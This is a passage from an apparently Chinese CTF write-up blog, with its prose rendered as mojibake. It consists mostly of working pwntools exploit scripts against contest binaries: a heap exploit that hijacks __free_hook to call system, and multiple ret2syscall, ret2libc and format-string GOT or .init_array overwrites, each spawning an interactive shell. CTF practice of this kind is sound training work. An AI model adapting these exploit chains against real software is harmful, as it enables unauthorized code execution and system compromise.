class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">chance = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">give_name</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;\n&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compose</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input some\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exhibit_edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;idx: \n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Would you like to make final edits?\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;input your content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exhibit</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;idx: \n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Would you like to make final edits?&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">script</span>(<span class="params">idx, choice, content</span>):</span><br><span class="line">    <span class="keyword">global</span> chance</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> chance == <span class="number">1</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;idx: \n&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        chance = chance - <span class="number">1</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;do you want crazy\n&#x27;</span>, choice)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Go ahead and doodle for your artistic inspiration.\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">give_name(<span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#0</span></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#1</span></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#2</span></span><br><span class="line">exhibit(<span class="number">2</span>)</span><br><span class="line">exhibit(<span class="number">0</span>)</span><br><span class="line">exhibit(<span class="number">1</span>)</span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#3</span></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">script(<span class="number">3</span>, <span class="string">b&#x27;no&#x27;</span>, <span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">exhibit(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please enjoy your masterpiece.\n&#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x263</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">script(<span class="number">3</span>, <span class="string">b&#x27;no&#x27;</span>, p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#5</span></span><br><span class="line">compose(p16(<span class="number">0</span>)*<span class="number">7</span> + p16(<span class="number">7</span>))  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">exhibit(<span class="number">5</span>)</span><br><span class="line">exhibit(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">exhibit_edit(<span class="number">6</span>, p8(<span class="number">0</span>)*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#7</span></span><br><span class="line">exhibit(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fc8d867dc61</span>-<span class="number">0x7fc8d8491000</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">compose(<span class="string">b&#x27;a&#x27;</span>)   <span class="comment">#8</span></span><br><span class="line">compose(<span class="string">b&#x27;b&#x27;</span>)   <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">exhibit(<span class="number">8</span>)</span><br><span class="line">exhibit(<span class="number">9</span>)</span><br><span class="line">script(<span class="number">3</span>, <span class="string">b&#x27;no&#x27;</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">compose(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#10</span></span><br><span class="line">compose(p64(system))</span><br><span class="line"></span><br><span class="line">exhibit(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023é™‡å‰‘æ¯åŠå†³èµ›-æ€»å†³èµ›RHG"><a href="#2023é™‡å‰‘æ¯åŠå†³èµ›-æ€»å†³èµ›RHG" class="headerlink" title="2023é™‡å‰‘æ¯åŠå†³èµ›/æ€»å†³èµ›RHG"></a>2023é™‡å‰‘æ¯åŠå†³èµ›/æ€»å†³èµ›RHG</h1><p>å°±å›æ¸©ä¸€äº›æœ€åŸºç¡€çš„ ret2 ç³»åˆ—ã€‚</p><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><h3 id="bin1"><a href="#bin1" class="headerlink" title="bin1"></a>bin1</h3><p>é™æ€é“¾æ¥ï¼Œgadgets å¾ˆå¤šï¼Œ64 ä½ï¼Œæ‰“ ret2syscallã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211418987.png" alt="image-20230921141824811" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin1&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Please shoot me&quot;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000410023</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000449085</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004005af</span></span><br><span class="line">syscall = <span class="number">0x000000000040129c</span></span><br><span class="line">binsh = <span class="number">0x6BC3A0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;yes or no?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin2"><a href="#bin2" class="headerlink" title="bin2"></a>bin2</h3><p>åŒä¸Šï¼Œä¸è¿‡æ˜¯ 32 ä½çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin2&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080488fc</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806e111</span></span><br><span class="line">syscall = <span class="number">0x080488f8</span></span><br><span class="line">binsh = <span class="number">0x80DA068</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(binsh)</span><br><span class="line">payload += p32(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Please start your challenge\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin3"><a href="#bin3" class="headerlink" title="bin3"></a>bin3</h3><p>system å’Œ /bin/sh éƒ½æœ‰ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211427229.png" alt="image-20230921142755879" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin3&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x80485BB</span></span><br><span class="line">binsh = <span class="number">0x804B028</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>) + p32(system) + p32(binsh)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;You still only have one input opportunity.\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin4"><a href="#bin4" class="headerlink" title="bin4"></a>bin4</h3><p>ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæœ‰åé—¨ï¼Œåœ¨æ ˆä¸Šæ‰¾åŠå¤©è·³æ¿æ‰“è¿”å›åœ°å€ï¼Œç”šè‡³æœ‰äº†çˆ†ç ´çš„æƒ³æ³•ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211454991.png" alt="image-20230921145442791" style="zoom: 33%;" /><p>ç»“æœç¨‹åº relro æ²¡å¼€ï¼Œæ‰“ .init_array å³å¯ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211457913.png" alt="image-20230921145704759" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211509081.png" alt="image-20230921150937751" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;b *0x400759&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x4006F8</span></span><br><span class="line"><span class="comment"># payload = b&#x27;%252c%8$hhn&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;%248c%8$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x6009B8</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Welcome to RHG! Enter your fmt &gt;&gt;&gt;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin5"><a href="#bin5" class="headerlink" title="bin5"></a>bin5</h3><p>ä¹Ÿæ˜¯ ret2syscallã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211517040.png" alt="image-20230921151736858" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin5&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x6BA0F0</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004005af</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x00000000004105c3</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000449575</span></span><br><span class="line">syscall = <span class="number">0x000000000040129c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;elf file!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><h3 id="bin20"><a href="#bin20" class="headerlink" title="bin20"></a>bin20</h3><p>64 ä½æ ˆæº¢å‡ºï¼Œbinsh å’Œ system éƒ½æœ‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin20&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007d3</span></span><br><span class="line">binsh = <span class="number">0x0602048</span></span><br><span class="line">system = <span class="number">0x40070B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin21"><a href="#bin21" class="headerlink" title="bin21"></a>bin21</h3><p>æ ˆæº¢å‡ºï¼Œæœ‰åé—¨ï¼Œæ³¨æ„å¯¹é½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin21&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4006E8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(backdoor+<span class="number">1</span>)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *0x400740&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin22"><a href="#bin22" class="headerlink" title="bin22"></a>bin22</h3><p>åŠ¨æ€é“¾æ¥çš„ 32 ä½ï¼Œæ— åé—¨ï¼Œéœ€è¦ ret2libcï¼Œæ³¨æ„é“¾å­çš„æ„é€ ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin22&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bin22&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how much character do you want to send?\n&quot;</span>, <span class="string">b&#x27;50&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(elf.sym[<span class="string">&quot;puts&quot;</span>]) + p32(elf.sym[<span class="string">&quot;main&quot;</span>]) + p32(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x804867B&quot;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) - <span class="number">0x73260</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># print(hex(elf.sym[&quot;puts&quot;]))q</span></span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how much character do you want to send?\n&quot;</span>, <span class="string">b&#x27;50&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(system) + p32(elf.sym[<span class="string">&quot;main&quot;</span>]) + p32(binsh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin23"><a href="#bin23" class="headerlink" title="bin23"></a>bin23</h3><p>è·Ÿ day1 çš„ bin5 å¤§å·®ä¸å·®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin23&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004005af</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x00000000004105c3</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000449575</span></span><br><span class="line">syscall = <span class="number">0x000000000040129c</span></span><br><span class="line">binsh = <span class="number">0x493328</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;elf file!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin24"><a href="#bin24" class="headerlink" title="bin24"></a>bin24</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬ä¸€æ¬¡æ³„éœ² libcï¼Œç¬¬äºŒæ¬¡åŠ«æŒ printf_got ä¸º systemï¼Œè®¡ç®—åç§»æœ‰äº›éº»çƒ¦ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211944021.png" alt="image-20230921194450754" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin24&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x601028</span></span><br><span class="line">payload = <span class="string">b&#x27;%39$p&#x27;</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x100, b&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># offset = 0x7f0df258e040 - 0x7f0df2200000</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x400790&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - (<span class="number">0x7fd389229d90</span> - <span class="number">0x7fd389200000</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">printf = libc_base + libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;printf ==&gt; &quot;</span>+<span class="built_in">hex</span>(printf))</span><br><span class="line">log.success(<span class="string">&quot;system ==&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">off1 = (system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">off2 = (system &amp; <span class="number">0xffff</span>) -off1-<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(off1).encode() + <span class="string">b&quot;c&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%10$hhn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">16</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(off2).encode() + <span class="string">b&quot;c&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%11$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(printf_got+<span class="number">2</span>) + p64(printf_got)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x400790&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2022å¼ºç½‘æ¯åˆèµ›"><a href="#2022å¼ºç½‘æ¯åˆèµ›" class="headerlink" title="2022å¼ºç½‘æ¯åˆèµ›"></a>2022å¼ºç½‘æ¯åˆèµ›</h1><h2 id="1-house-of-cat"><a href="#1-house-of-cat" class="headerlink" title="1. house of cat"></a>1. house of 